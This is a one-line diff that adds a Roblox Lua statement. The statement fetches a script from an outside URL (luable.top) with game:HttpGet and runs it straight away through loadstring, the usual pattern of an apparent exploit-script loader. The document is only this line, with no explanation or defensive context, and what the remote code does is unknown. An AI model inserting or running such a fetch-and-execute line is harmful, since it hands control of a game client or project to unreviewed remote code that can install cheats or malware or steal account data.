@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://luable.top/acm"))()
